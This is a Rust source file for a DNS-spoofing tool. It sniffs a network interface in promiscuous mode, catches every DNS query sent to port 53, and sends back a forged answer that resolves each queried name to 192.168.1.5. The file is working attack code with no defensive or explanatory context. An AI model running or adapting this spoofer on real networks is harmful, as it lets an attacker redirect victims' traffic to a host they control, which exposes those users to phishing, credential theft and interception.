extern crate fake_dns;
extern crate pnet;
extern crate pcap;
extern crate string_error;

use string_error::{static_err};

use pcap::{Device, Capture, Active};

use pnet::packet::Packet;
use pnet::packet::ethernet::EthernetPacket;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::udp::UdpPacket;
use pnet::packet::ip::IpNextHeaderProtocols;

use std::net::{UdpSocket, SocketAddr};
use std::error::Error;
use std::env::args;

use fake_dns::dns::{message, parser, serializer};

fn main() {
    sniff().unwrap()
}

fn sniff() -> Result<(), Box<Error>> {
    let socket = UdpSocket::bind(SocketAddr::from(([0,0,0,0], 0))).expect("couldn't bind to address");

    let device_name = &args().collect::<Vec<_>>()[1];
    let mut cap = init_capture(device_name.to_string())?;
    loop {
        while let Ok(packet) = cap.next() {
            let eth_packet: EthernetPacket = EthernetPacket::new(packet.data).unwrap();
            let ip_packet: Ipv4Packet = Ipv4Packet::new(eth_packet.payload()).unwrap();
            let udp_packet: UdpPacket = if ip_packet.get_next_level_protocol() == IpNextHeaderProtocols::Udp {
                UdpPacket::new(ip_packet.payload()).ok_or(static_err("Parse udp failed."))?
            } else {
                continue;
            };
            if !(udp_packet.get_destination() == 53) {// || udp_packet.get_source() == 53) {
                continue;
            }
            let mut parser = parser::Parser::new(udp_packet.payload().to_vec());
            let mut dns_message = parser.parse();
            // if dns_message.is_a_record, is_query
            let aname = dns_message.query_sections[0].qname.clone();
            dns_message.set_answer(
                message::AnswerSection {
                    aname: aname,
                    atype: 1,
                    aclass: 1,
                    ttl: 3600,
                    rdlength: 0,
                    rdata: message::RData::Ipv4(vec![192,168,1,5])
                }
            );
            let dns_bytes = serializer::serialize(dns_message);
            let dest = SocketAddr::from((ip_packet.get_source(), udp_packet.get_source()));
            socket.send_to(&dns_bytes, dest.clone()).expect("couldn't send packet");
            println!("sent to {:?}!", dest);
        }
    }
}

fn init_capture(name: String) -> Result<Capture<Active>, Box<Error>> {
    let device = Device::list()?
                    .into_iter()
                    .find(|device| device.name == name)
                    .expect("Device not found.");
    let cap = Capture::from_device(device)?
                    .promisc(true)
                    .snaplen(5000)
                    .open()?;
    Ok(cap)
}
